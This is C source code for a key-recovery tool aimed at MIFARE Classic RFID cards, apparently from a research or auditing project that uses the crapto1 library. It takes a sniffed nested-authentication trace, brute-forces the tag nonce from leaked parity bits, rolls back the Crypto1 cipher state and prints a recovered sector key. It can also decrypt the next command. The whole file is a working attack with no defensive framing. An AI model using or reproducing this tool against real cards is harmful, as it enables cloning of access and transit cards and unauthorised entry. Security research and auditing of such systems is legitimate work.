#include<stdio.h>
#include<stdlib.h>
#include<stdint.h>
#include<unistd.h>
#include<string.h>

#include "crapto1.h"

char calc_parity(char byte);
uint16_t parity_from_err(uint32_t data, uint16_t par_err);
uint16_t xored_bits(uint16_t nt_par, uint32_t nt_enc, uint16_t ar_par, uint32_t ar_enc, uint16_t at_par, uint32_t at_enc);
char valid_nonce(uint32_t xored, uint32_t nt);

int main(int argc, char *argv[]) {
	
	// input
	uint32_t uid	= 0x00000000;	// uid
	uint32_t nt_enc = 0x00000000;	// encrypted tag challenge
	uint32_t nr_enc = 0x00000000;	// encrypted reader challenge
	uint32_t ar_enc = 0x00000000;	// encrypted reader response
	uint32_t at_enc = 0x00000000;	// encrypted tag response
	
	uint16_t nt_par_err = 0x0000;
	uint16_t ar_par_err = 0x0000;
	uint16_t at_par_err = 0x0000;
	
	uint32_t cmd_enc = 0x00000000;
	// end_input
	
	printf("Mifare classic nested auth key recovery. Phase 1\n");
	
	if(argc < 9) {
		printf(" syntax: %s <uid> <nt> <nt_par_err> <nr> <ar> <ar_par_err> <at> <at_par_err> [<next command>]\n\n",argv[0]);
		printf(" example:   nt in trace = 8c!  42 e6! 4e!\n");
		printf("                     nt = 8c42e64e\n");
		printf("             nt_par_err = 1011\n\n");
		return 1;
	}
	
	//~ printf("argc: %d\n",argc);
	//~ for(int i=0; i<argc; i++) {
		//~ printf("argv[%d] = %s\n",i,argv[i]);
	//~ }
	
	sscanf(argv[1],"%x",&uid);
	
	sscanf(argv[2],"%x",&nt_enc);
	sscanf(argv[3],"%x",&nt_par_err);
	
	sscanf(argv[4],"%x",&nr_enc);
	
	sscanf(argv[5],"%x",&ar_enc);
	sscanf(argv[6],"%x",&ar_par_err);
	
	sscanf(argv[7],"%x",&at_enc);
	sscanf(argv[8],"%x",&at_par_err);
	
	if(argc > 9) {
		sscanf(argv[9],"%x",&cmd_enc);
	}
	
	printf("uid:\t%08x\n",uid);
	printf("nt:\t%08x\n",nt_enc);
	printf("nt_par_err: %04x\n",nt_par_err);
	printf("nr:\t%08x\n",nr_enc);
	printf("ar:\t%08x\n",ar_enc);
	printf("ar_par_err: %04x\n",ar_par_err);
	printf("at:\t%08x\n",at_enc);
	printf("at_par_err: %04x\n",at_par_err);
	if(argc > 9) {
		printf("cmd:\t%08x\n\n",cmd_enc);
	}
	
	uint16_t nt_par = parity_from_err(nt_enc, nt_par_err);
	uint16_t ar_par = parity_from_err(ar_enc, ar_par_err);
	uint16_t at_par = parity_from_err(at_enc, at_par_err);
	
	printf("nt_par: %04x\n",nt_par);
	printf("ar_par: %04x\n",ar_par);
	printf("at_par: %04x\n\n",at_par);
	
	//calc (parity XOR corresponding nonce bit encoded with the same keystream bit)
	uint16_t xored = xored_bits(nt_par, nt_enc, ar_par, ar_enc, at_par, at_enc);
	
	struct Crypto1State *revstate;
	uint64_t key;
	uint32_t ks2;
	uint32_t ks3;
	uint32_t ks4;
	uint32_t nt;
	int rolled_bytes = 0;
	
	for(nt=0x00000000; nt < 0x0000ffff; nt++) {
		
		if(valid_nonce(xored, nt)) {
			printf("nt: %08x...\n", nt);
			rolled_bytes = 0;
			ks2 = ar_enc ^ prng_successor(nt, 64);
			ks3 = at_enc ^ prng_successor(nt, 96);
			revstate = lfsr_recovery64(ks2, ks3);
			
			ks4 = crypto1_word(revstate,0,0);
			rolled_bytes +=4;

			if (ks4 != 0) {
				printf("\n**** Key candidate found ****\n");
				printf("current nt:%08x\n", nt);
				printf("current ar_enc:%08x\n", ar_enc);
				printf("current at_enc:%08x\n", at_enc);
				printf("ks2:%08x\n", ks2);
				printf("ks3:%08x\n", ks3);
				printf("ks4:%08x\n", ks4);
				if(cmd_enc) {
					printf("enc cmd:\t%08x\n", cmd_enc);		
					printf("decrypted cmd:\t%08x\n", ks4^cmd_enc);
				}				
				for(int i=0; i<rolled_bytes; i++) {
					lfsr_rollback_byte(revstate,0,0);
				}

				lfsr_rollback_word(revstate, 0, 0);
				lfsr_rollback_word(revstate, 0, 0);
				lfsr_rollback_word(revstate, nr_enc, 1);
				lfsr_rollback_word(revstate, uid ^ nt, 0);
				crypto1_get_lfsr(revstate, &key);
				printf("\nKey candidate: [%012lx]\n\n",key);
				return 0;
			}
			crypto1_destroy(revstate);
		}
		//~ sleep(10);
	}
	
	return 0;
}

char calc_parity(char byte) {
	char par = 0x0;
	int i;
	for(i=0; i<8; i++) {
		par = par ^ (byte & 0x1);
		byte = byte >> 1;
	}
	return (par ^ 0x1); //odd parity
}

uint16_t parity_from_err(uint32_t data, uint16_t par_err) {
	uint16_t par = 0x0;
	par = par | (calc_parity((data & 0xff000000) >> 24) ^ ((par_err & 0x1000) >> 12));
	par = par << 4;
	par = par | (calc_parity((data & 0x00ff0000) >> 16) ^ ((par_err & 0x0100) >> 8));
	par = par << 4;
	par = par | (calc_parity((data & 0x0000ff00) >> 8) ^ ((par_err & 0x0010) >> 4));
	par = par << 4;
	par = par | (calc_parity(data & 0x000000ff) ^ (par_err & 0x0001));
	return par;
}

uint16_t xored_bits(uint16_t nt_par, uint32_t nt_enc, uint16_t ar_par, uint32_t ar_enc, uint16_t at_par, uint32_t at_enc) {
	uint16_t xored = 0x0000;
	
	char par;
	//1st (1st nt)
	par = (nt_par & 0x1000) >> 12;
	xored = xored | ( par ^ ((nt_enc & 0x00010000) >> 16) );
	xored = xored << 1;
	//2nd (2nd nt)
	par = (nt_par & 0x0100) >> 8;
	xored = xored | ( par ^ ((nt_enc & 0x00000100) >> 8) );
	xored = xored << 1;
	//3rd (3rd nt)
	par = (nt_par & 0x0010) >> 4;
	xored = xored | ( par ^ (nt_enc & 0x00000001) );
	xored = xored << 1;
	//4th (1st ar)
	par = (ar_par & 0x1000) >> 12;
	xored = xored | ( par ^ ((ar_enc & 0x00010000) >> 16) );
	xored = xored << 1;
	//5th (2nd ar)
	par = (ar_par & 0x0100) >> 8;
	xored = xored | ( par ^ ((ar_enc & 0x00000100) >> 8) );
	xored = xored << 1;
	//6th (3rd ar)
	par = (ar_par & 0x0010) >> 4;
	xored = xored | ( par ^ (ar_enc & 0x00000001) );
	xored = xored << 1;
	//7th (4th ar)
	par = (ar_par & 0x0001);
	xored = xored | ( par ^ ((at_enc & 0x01000000) >> 24) );
	xored = xored << 1;
	//8th (1st at)
	par = (at_par & 0x1000) >> 12;
	xored = xored | ( par ^ ((at_enc & 0x00010000) >> 16) );
	xored = xored << 1;
	//9th (2nd at)
	par = (at_par & 0x0100) >> 8;
	xored = xored | ( par ^ ((at_enc & 0x00000100) >> 8) );
	xored = xored << 1;
	//10th (3rd at)
	par = (at_par & 0x0010) >> 4;
	xored = xored | ( par ^ (at_enc & 0x00000001) );
	
	return xored;
}

char valid_nonce(uint32_t magic, uint32_t nt) {
	char byte;
	char check;
	
	//1st (1st nt)
	//~ byte = (nt & 0xff000000) >> 24;
	//~ check = calc_parity(byte) ^ ((nt & 0x00010000) >> 16) ^ ((magic & 0x0200) >> 9);
	//~ if(check)
		//~ return 0;
		
	//2nd (2nd nt)
	//~ byte = (nt & 0x00ff0000) >> 16;
	//~ check = calc_parity(byte) ^ ((nt & 0x00000100) >> 8) ^ ((magic & 0x0100) >> 8);
	//~ if(check)
		//~ return 0;
		
	//3rd (3rd nt)
	byte = (nt & 0x0000ff00) >> 8;
	check = calc_parity(byte) ^ (nt & 0x00000001) ^ ((magic & 0x0080) >> 7);
	if(check) {
		//~ printf("errore 3\n");
		return 0;
	}
	
	uint32_t ar = prng_successor(nt, 64);
	
	//4th (1st ar)
	byte = (ar & 0xff000000) >> 24;
	check = calc_parity(byte) ^ ((ar & 0x00010000) >> 16) ^ ((magic & 0x0040) >> 6);
	if(check) {
		//~ printf("errore 4\n");
		return 0;
	}
	
	//5th (2nd ar)
	byte = (ar & 0x00ff0000) >> 16;
	check = calc_parity(byte) ^ ((ar & 0x00000100) >> 8) ^ ((magic & 0x0020) >> 5);
	if(check) {
		//~ printf("errore 5\n");
		return 0;
	}
	
	//6th (3rd ar)
	byte = (ar & 0x0000ff00) >> 8;
	check = calc_parity(byte) ^ (ar & 0x00000001) ^ ((magic & 0x0010) >> 4);
	if(check) {
		//~ printf("errore 6\n");
		return 0;
	}
		
	uint32_t at = prng_successor(nt, 96);
		
	//7th (4th ar)
	byte = (ar & 0x000000ff);
	check = calc_parity(byte) ^ ((at & 0x01000000) >> 24) ^ ((magic & 0x0008) >> 3);
	if(check) {
		//~ printf("errore 7\n");
		return 0;
	}
	
	//8th (1st at)
	byte = (at & 0xff000000) >> 24;
	check = calc_parity(byte) ^ ((at & 0x00010000) >> 16) ^ ((magic & 0x0004) >> 2);
	if(check) {
		//~ printf("errore 8\n");
		return 0;
	}
	
	//9th (2nd at)
	byte = (at & 0x00ff0000) >> 16;
	check = calc_parity(byte) ^ ((at & 0x00000100) >> 8) ^ ((magic & 0x0002) >> 1);
	if(check) {
		//~ printf("errore 9\n");
		return 0;
	}
	
	//10th (3rd at)
	byte = (at & 0x0000ff00) >> 8;
	check = calc_parity(byte) ^ (at & 0x00000001) ^ ((magic & 0x0001));
	if(check) {
		//~ printf("errore 10\n");
		return 0;
	}
		
	return 1;
}
